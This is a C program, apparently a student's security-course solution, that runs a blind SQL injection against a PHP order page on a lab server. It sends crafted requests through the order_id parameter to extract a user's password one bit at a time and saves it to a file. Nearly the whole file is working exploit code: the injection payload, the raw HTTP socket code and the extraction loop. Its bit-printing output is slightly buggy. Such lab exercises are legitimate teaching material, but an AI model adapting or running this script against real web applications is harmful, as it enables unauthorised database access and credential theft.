#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


#define MAX_PASSWORD_LENGTH 10
#define STUDENT_ID "315177444"  // Replace with your actual ID
#define OUTPUT_FILE STUDENT_ID ".txt"
#define SERVER_IP "192.168.1.202"   // Change if different
#define SERVER_PORT 80
#define ASCII_START 32
#define ASCII_END 126


// Function to send an HTTP request and check if the bit is 1
int check_bit(int char_pos, int bit_pos) {
    int sock;
    struct sockaddr_in server;
    char request[512], response[1024];

    // SQLi payload to extract the bit
    snprintf(request, sizeof(request),
             "GET /index.php?order_id=2+AND+(SELECT+(ASCII(SUBSTRING(password%%2C%d%%2C1)))+%%26+(1<<%d)+FROM+users+WHERE+id%%3D%s)%%3B+-- HTTP/1.1\r\n"
             "Host: localhost\r\n"
             "Connection: close\r\n\r\n",
             char_pos, bit_pos, STUDENT_ID);
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 0;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to web server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0;
    }

    // Send HTTP request
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
        close(sock);
        return 0;
    }

    // Receive HTTP response
    int received = (int) recv(sock, response, sizeof(response) - 1, 0);
    if (received < 0) {
        perror("Receive failed");
        close(sock);
        return 0;
    }
    response[received] = '\0';  // Null-terminate response
    close(sock);

    // Check if the response contains "Your order has been sent!"
    return strstr(response, "Your order has been sent!") != NULL;
}

// Function to extract the full password bit by bit
void extract_password() {
    char password[MAX_PASSWORD_LENGTH + 1] = {0};

    FILE *file = fopen(OUTPUT_FILE, "w");
    if (!file) {
        perror("Failed to open output file");
        exit(EXIT_FAILURE);
    }


    printf("Starting Blind SQL Injection attack...\n");
    int querry_count = 0;
    for (int pos = 1; pos <= MAX_PASSWORD_LENGTH; pos++) {  
        int ascii_value = 0;

        // Extract each bit from 7 to 0
        for (int bit = 7; bit >= 0; bit--) {
            querry_count+=1;
            if (check_bit(pos, bit)) {
                ascii_value |= (1 << bit);  // Set the bit if it's 1
                printf("1");
            }
            printf("0");
        }
        printf("\n");

        // Store extracted character
        password[pos - 1] = (char)ascii_value;
        printf("Extracted character at position %d: %c (ASCII: %d)\n", pos, password[pos - 1], ascii_value);

        // Stop if NULL character is reached (end of password)
        if (ascii_value == 0) break;
    }
    printf("number of queries sent: %d\n", querry_count);
    // Save extracted password
    fprintf(file, "*%s*", password);
    fclose(file);
    printf("Extracted Password: %s\n", password);
}


int main() {
    extract_password();
    return 0;
}
